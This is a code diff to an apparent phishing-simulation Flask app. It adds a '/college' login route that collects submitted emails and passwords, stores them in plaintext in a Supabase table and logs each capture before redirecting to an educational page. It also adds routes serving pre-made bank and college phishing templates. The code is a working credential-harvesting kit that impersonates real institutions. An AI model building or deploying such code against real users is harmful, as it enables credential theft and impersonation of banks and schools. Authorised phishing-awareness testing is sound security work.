@@ -155,6 +155,29 @@ def handle_login():
         
     return redirect(url_for('phishing_info'))
 
+@app.route("/college", methods=['POST'])
+def college_login():
+    """Captures credentials and redirects to the phishing info page."""
+    if not supabase:
+        print("Error: Supabase client not initialized. Cannot save credentials.")
+        return redirect(url_for('phishing_info')) # Redirect anyway
+
+    try:
+        email = request.form.get('email')
+        password = request.form.get('password')
+        
+        login_data = {
+            "email": email,
+            "password": password,
+            "login_time": datetime.now().isoformat()
+        }
+        supabase.table('logins').insert(login_data).execute()
+        print(f"Successfully captured credentials for: {email}")
+    except Exception as e:
+        print(f"Error sending login data to Supabase: {e}")
+        
+    return redirect(url_for('phishing_info'))
+
 @app.route("/phish", methods=['GET'])
 def phishing_info():
     """Displays the educational page about the phishing simulation."""
@@ -166,6 +189,16 @@ def phishing_info():
 def email_sender_page():
     """Renders the email sending UI."""
     return render_template('email.html')
+
+@app.route("/banktxt", methods=['GET'])
+def bank_template_page():
+    """Renders the pre-made phishing bank template."""
+    return render_template('banktxt.html')
+
+@app.route("/college", methods=['GET'])
+def college_template_page():
+    """Renders the pre-made phishing college template."""
+    return render_template('college.html')
 
 @app.route("/sms", methods=['GET'])
 def sms_sender_page():
